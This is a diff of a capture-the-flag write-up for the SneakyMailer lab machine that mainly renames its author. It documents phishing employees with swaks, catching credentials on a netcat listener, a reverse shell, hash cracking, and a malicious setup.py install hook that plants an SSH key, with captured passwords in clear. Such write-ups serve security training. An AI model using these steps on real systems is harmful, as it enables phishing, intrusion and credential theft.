@@ -9,6 +9,7 @@ avatar: assets/htb/sneakymailer.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/SneakyMailer
 ---
+
 ## Useful Skills and Tools
 
 #### Save a transcript of any session \(even remote nc sessions!\)
@@ -22,7 +23,7 @@ htb_url: https://app.hackthebox.com/machines/SneakyMailer
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/sneakymailer]
+┌──(kac0㉿kali)-[~/htb/sneakymailer]
 └─$ nmap -n -v -sCV -p- <YOUR_IP>
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 16:59 EST
 NSE: Loaded 153 scripts for scanning.
@@ -124,11 +125,11 @@ Nmap done: 1 IP address (1 host up) scanned in 81.28 seconds
 ### Port 21 - FTP
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/sneakymailer]
+┌──(kac0㉿kali)-[~/htb/sneakymailer]
 └─$ ftp <YOUR_IP>
 Connected to <YOUR_IP>.
 220 (vsFTPd 3.0.3)
-Name (<YOUR_IP>:zweilos): anonymous
+Name (<YOUR_IP>:kac0): anonymous
 530 Permission denied.
 Login failed.
 ftp> exit
@@ -141,19 +142,19 @@ First I tried anonymous login through FTP, but was denied access.
 
 port 80 - redirected to [http://sneakycorp.htb/](http://sneakycorp.htb/) - added to /etc/hosts
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-sneakycorp.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-sneakycorp.png)
 
 After adding the domain name to /etc/hosts
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-messages.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-messages.png)
 
 I found the names Cara Stevens & Bradley Greer from the messages pop-up.  Possible usernames can be extracted from these names using common business username patterns.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-messages2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-messages2.png)
 
 I also checked the page source code to see if there was anything interesting in the messages that couldn't be seen in the previews, and found that Bradley Greer was my 'personal tester' and Cara Stevens was the owner of the company.  Both seemed like good targets.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-users-list.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-users-list.png)
 
 On the `/team.php` page there was a listing of company employees.  
 
@@ -224,22 +225,22 @@ There was a huge list of employees at the company. I added the usernames and ema
 I found out afterwards that there is a nice tool that can extract emails from a page: [https://email-checker.net/extract](https://email-checker.net/extract)
 {% endhint %}
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-sneakycorp-register.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-sneakycorp-register.png)
 
 In the source code of the page I also found a reference to a register page at `/pypi/register.php`.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-sneakycorp-dirbust-pypi.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-sneakycorp-dirbust-pypi.png)
 
 Dirbuster also found this page shortly afterwards, though there wasn't much else to look through.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-sneakycorp-register2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-sneakycorp-register2.png)
 
 I navigated to this register page and tried to create an account, however it did not seem to be functional.
 
 typing in pypi.sneakycorp.htb redirects to the main page, loaded ffuf to see if I could find any other virtual hosts
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/sneakymailer]
+┌──(kac0㉿kali)-[~/htb/sneakymailer]
 └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.sneakycorp.htb/ -c                     
 
         /'___\  /'___\           /'___\       
@@ -264,29 +265,29 @@ ________________________________________________
 dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-dev-sneakycorp.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-dev-sneakycorp.png)
 
 on dev.sneakycorp.htb found a site that was almost identical to main page, though the register page was visible in a link here. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-dev-sneakycorp-register.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-dev-sneakycorp-register.png)
 
 Tried to register again
 
 ### Port 8080 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-dev-sneakycorp-8080.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-dev-sneakycorp-8080.png)
 
 Decided to check out the port 8080 on each of the virtual hosts, dev did not lead anywhere
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080.png)
 
 , but pypi did: [http://pypi.sneakycorp.htb:8080/](http://pypi.sneakycorp.htb:8080/)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080-old.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080-old.png)
 
 found pypiserver version 1.3.2 - newest is 1.4.2
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080-auth.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080-auth.png)
 
 [https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273](https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273)
 
@@ -295,7 +296,7 @@ found pypiserver version 1.3.2 - newest is 1.4.2
 #### Verifying valid email addresses
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/sneakymailer]
+┌──(kac0㉿kali)-[~/htb/sneakymailer]
 └─$ telnet sneakycorp.htb 25                                                                        1 ⨯
 Trying <YOUR_IP>...
 Connected to sneakycorp.htb.
@@ -305,7 +306,7 @@ HELO
 501 Syntax: HELO hostname
 HELO sneakycorp.htb
 250 debian
-MAIL FROM:zweilos@sneakycorp.htb
+MAIL FROM:kac0@sneakycorp.htb
 250 2.1.0 Ok
 RCPT TO:bradleygreer@sneakymailer.htb
 250 2.1.5 Ok
@@ -380,9 +381,9 @@ verified all the usernames
 Searched how to interact with SMTP through command line - [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/sneakymailer]
+┌──(kac0㉿kali)-[~/htb/sneakymailer]
 └─$ for address in $(cat users); do swaks --helo sneakycorp.htb \
---to $address --from zweilos@sneakymailer.htb --header "Subject: Check this out" \
+--to $address --from kac0@sneakymailer.htb --header "Subject: Check this out" \
 --body "Check this out! http://10.10.15.100:8090/" --server <YOUR_IP>; done
   
 === Trying <YOUR_IP>:25...
@@ -400,7 +401,7 @@ Searched how to interact with SMTP through command line - [https://github.com/je
 <-  250-DSN
 <-  250-SMTPUTF8
 <-  250 CHUNKING
- -> MAIL FROM:<zweilos@sneakymailer.htb>
+ -> MAIL FROM:<kac0@sneakymailer.htb>
 <-  250 2.1.0 Ok
  -> RCPT TO:<airisatou@sneakymailer.htb>
 <-  250 2.1.5 Ok
@@ -408,7 +409,7 @@ Searched how to interact with SMTP through command line - [https://github.com/je
 <-  354 End data with <CR><LF>.<CR><LF>
  -> Date: Sun, 08 Nov 2020 21:03:55 -0500
  -> To: airisatou@sneakymailer.htb
- -> From: zweilos@sneakymailer.htb
+ -> From: kac0@sneakymailer.htb
  -> Subject: Check this out
  -> Message-Id: <20201108210355.081776@kali.kali>
  -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
@@ -436,7 +437,7 @@ Searched how to interact with SMTP through command line - [https://github.com/je
 <-  250-DSN
 <-  250-SMTPUTF8
 <-  250 CHUNKING
- -> MAIL FROM:<zweilos@sneakymailer.htb>
+ -> MAIL FROM:<kac0@sneakymailer.htb>
 <-  250 2.1.0 Ok
  -> RCPT TO:<angelicaramos@sneakymailer.htb>
 <-  250 2.1.5 Ok
@@ -444,7 +445,7 @@ Searched how to interact with SMTP through command line - [https://github.com/je
 <-  354 End data with <CR><LF>.<CR><LF>
  -> Date: Sun, 08 Nov 2020 21:04:05 -0500
  -> To: angelicaramos@sneakymailer.htb
- -> From: zweilos@sneakymailer.htb
+ -> From: kac0@sneakymailer.htb
  -> Subject: Check this out
  -> Message-Id: <20201108210405.081780@kali.kali>
  -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
@@ -462,7 +463,7 @@ Searched how to interact with SMTP through command line - [https://github.com/je
 no reply, so maybe try working local address? also put the "link" on a new line in case whatever script cant parse it for some reason \(maybe the `!`?\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/sneakymailer]
+┌──(kac0㉿kali)-[~/htb/sneakymailer]
 └─$ for address in $(cat users); do swaks --helo sneakycorp.htb \
 --to $address --from root@sneakymailer.htb --header "Subject: Check this out" \
 --body "Check this out. \nhttp://10.10.15.100:8090/" --server <YOUR_IP>; done 
@@ -585,14 +586,14 @@ no reply, so maybe try working local address? also put the "link" on a new line 
 
 going to try restting box since getting no replies to phishing email, also remove `!` from body to see if that causing issues
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-password-capture1.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-password-capture1.png)
 
 Was doing packet capture the whole time trying to see if my messages were being sent/recieved, and finally got a reply back from one
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-password-capture.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-password-capture.png)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/sneakymailer]
+┌──(kac0㉿kali)-[~/htb/sneakymailer]
 └─$ nc -lvnp 8090                                                                                  1 ⨯
 listening on [any] 8090 ...
 connect to [10.10.14.174] from (UNKNOWN) [<YOUR_IP>] 51434
@@ -624,15 +625,15 @@ This decoded to give me a \(super-complicated\) password of:
 
 Since Paul was nice enough to send me his email password, I decided to log into his mailbox to see what kind of information I could find
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-thunderbyrd.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-thunderbyrd.png)
 
 I put in the account information for Paul into my email client and pointed the server towards the target.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-thunderbyrd-sent1.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-thunderbyrd-sent1.png)
 
 After logging into the mailbox I noticed there wasn't anything in the inbox \(probably emptied regularly to keep other players from accidentally clicking on each other's phishing email links\).  There were two messages in the `Sent items` folder, however.  The first was an email to the administrator `root@debian` asking them to change the password for the `developer` account.  He was nice enough to send the old password `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` as well.  I made sure to take note of this in case it was used anywhere, or in case the admin hadn't changed it yet.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-thunderbyrd-sent2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-thunderbyrd-sent2.png)
 
 The second email was addressed to `low`, which I thought was another potential username on the machine.  The message laid out a task to "install, test, and then erase" all of the modules in the PyPI service.  I hoped that perhaps Paul had created a script to automate this action, and that I could possibly get it to execute a module I somehow got installed to the service.
 
@@ -647,11 +648,11 @@ Please notify me when you do it
 
 Since I now had credentials, I though it would most likely log into the PyPI server I found earlier.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in%2520%25281%2529.png)
 
 nothing in packages
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in2%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in2%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529.png)
 
 nor in the index page
 
@@ -660,11 +661,11 @@ However, this did not work, nor did logging into SSH.  I checked back with my nm
 ### FTP Enumeration
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/sneakymailer]
+┌──(kac0㉿kali)-[~/htb/sneakymailer]
 └─$ ftp <YOUR_IP>                                                                              255 ⨯
 Connected to <YOUR_IP>.
 220 (vsFTPd 3.0.3)
-Name (<YOUR_IP>:zweilos): developer
+Name (<YOUR_IP>:kac0): developer
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -826,15 +827,15 @@ system($var);
 
 ## Initial Foothold
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-code-exec.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-code-exec.png)
 
 Using this I was able to identify that I was running in the context of `www-data`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-etc-passwd.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-etc-passwd.png)
 
 , and that there were three users that could log into the machine: low, developer, and root
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-ssh-key.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-ssh-key.png)
 
 Next I tried adding my public SSH key to both `low` and `developer` since they could log in, but was unable to gain access with SSH since `www-data` could not write to those files.
 
@@ -861,11 +862,11 @@ Sec-GPC: 1
 sent my reverse shell, and immediately got a connection on my waiting netcat listener
 
 ```text
-zweilos@kali:~/htb/sneakymailer$ script sneaky-transcript
+kac0@kali:~/htb/sneakymailer$ script sneaky-transcript
 Script started, output log file is 'sneaky-transcript'.
-┌──(zweilos㉿kali)-[~/htb/sneakymailer]
+┌──(kac0㉿kali)-[~/htb/sneakymailer]
 └─$ bash                
-zweilos@kali:~/htb/sneakymailer$ nc -lvnp 46445
+kac0@kali:~/htb/sneakymailer$ nc -lvnp 46445
 listening on [any] 46445 ...
 connect to [10.10.14.174] from (UNKNOWN) [<YOUR_IP>] 60704
 bash: cannot set terminal process group (725): Inappropriate ioctl for device
@@ -874,8 +875,8 @@ www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ python -c 'import pty;pty.spawn(
 </dev$ python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^Z
 [1]+  Stopped                 nc -lvnp 46445
-zweilos@kali:~/htb/sneakymailer$ stty raw -echo
-zweilos@kali:~/htb/sneakymailer$ nc -lvnp 46445
+kac0@kali:~/htb/sneakymailer$ stty raw -echo
+kac0@kali:~/htb/sneakymailer$ nc -lvnp 46445
 
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export TERM=xterm-256color
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ id && hostname
@@ -936,7 +937,7 @@ pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
 found what looked like a hash for a user `pypi` in `.htpasswd` in the `pypi.sneakycorp.htb` folder
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ hash-identifier hashes                                                          
    #########################################################################
    #     __  __                     __           ______    _____           #
@@ -964,7 +965,7 @@ Possible Hashs:
 the hash came up as type MD5\(APR\)
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ hashcat --help | grep -i APR                                                    
    1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | FTP, HTTP, SMTP, LDAP Server
 ```
@@ -974,7 +975,7 @@ hashcat's help ID'd it at an Apache MD5 hash
 ### Finding user creds
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ hashcat -a0 -m1600 --username htb/sneakymailer/hash /usr/share/wordlists/rockyou.txt         
 hashcat (v6.1.1) starting...
 
@@ -1025,9 +1026,9 @@ Stopped: Wed Nov 11 15:55:16 2020
 
 The password enabled me to log in to `http://pypi.sneakycorp.htb:8080/` with the creds `pypi:soufianeelhaoui`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in%2520%25281%2529%2520%25281%2529.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in2%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pypi-loggged-in2%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25281%2529.png)
 
 There was nothing interesting on either of the sites linked on this page however. 
 
@@ -1086,15 +1087,15 @@ import os
 
 if os.getuid() == 1000:
     with open("/home/low/.ssh/authorized_keys", "a") as fh:
-        fh.write("\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCOQVWrtHkqJofpMNDvUFQlPj7KHcLwMRo5BghGIW8tEAdl2yU0GQ03g2gKnUE9bDGP5NCW6uuEBxSUw73QCYws= zweilos@kali")
+        fh.write("\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCOQVWrtHkqJofpMNDvUFQlPj7KHcLwMRo5BghGIW8tEAdl2yU0GQ03g2gKnUE9bDGP5NCW6uuEBxSUw73QCYws= kac0@kali")
 
 long_description = "A sneaky pwn package"
 
 setuptools.setup(
     name="sneakymailer-pwn", # Replace with your own username
     version="0.0.1",
-    author="zweilos",
-    author_email="zweilos@sneakymailer.htb",
+    author="kac0",
+    author_email="kac0@sneakymailer.htb",
     description="A small pwny package",
     long_description=long_description,
     long_description_content_type="text/markdown",
@@ -1167,7 +1168,7 @@ WARNING: Uploading via this command is deprecated, use twine to upload instead (
 It complained a bit that I didn't create a readme, but it ran
 
 ```text
-┌──(zweilos㉿kali-[~/htb/sneakymailer]
+┌──(kac0㉿kali-[~/htb/sneakymailer]
 └─$ ssh -i dev low@sneakycorp.htb   
 The authenticity of host 'sneakycorp.htb (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:I1lCFRteozDGkqC/ZSE2SbHl8ISpJWhfu5nwn6LxbA0.
@@ -1194,7 +1195,7 @@ Matching Defaults entries for low on sneakymailer:
 User low may run the following commands on sneakymailer:
     (root) NOPASSWD: /usr/bin/pip3
 low@sneakymailer:~$ cat user.txt 
-0610****0a88
+0610************************0a88
 ```
 
 Next I tried logging in with the ssh key I had made and was successful!  I got that same temporary name resolution error when using `sudo -l`, where it seemed to hang for a minute, but this time I got a very interesting result!
@@ -1272,5 +1273,5 @@ drwxr-xr-x  3 root root 4096 May 14 12:57 .local
 -rwx------  1 root root   33 Nov 11 01:09 root.txt
 -rw-r--r--  1 root root   66 May 27 13:00 .selected_editor
 # cat root.txt
-8133****2998
+8133************************2998
 ```
